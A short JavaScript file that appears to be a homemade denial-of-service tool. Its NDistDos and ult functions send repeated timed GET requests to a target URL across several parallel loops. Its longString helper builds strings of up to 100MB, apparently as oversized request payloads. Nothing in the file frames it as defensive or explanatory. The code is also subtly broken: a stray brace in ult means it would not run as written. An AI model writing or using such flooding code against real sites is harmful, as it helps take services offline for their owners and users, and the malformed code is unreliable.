const axios = require('axios')
const nt = require("nodetime-js");

let time = nt.time; 
let t = nt.t;

function mk(url) {
  axios.get(url)
}

function mkPost(url, data) {
  axios.post(url, data)
}

function NDistDos(url, threads=2, interval) {
  Array(threads).fill(1).forEach(thread => {
    ult(url, interval)
  })
}

function ult(url_, interval_) {
  setInterval(()=>{
    mk(url_)
  }, interval_})
} 

function longString(msg, mb=10) {
  if (mb > 100) {
    throw new Error("Cap for string size is 100MB")
    return 
  }
  return msg.repeat((mb*1000000)/msg.length)
}
  

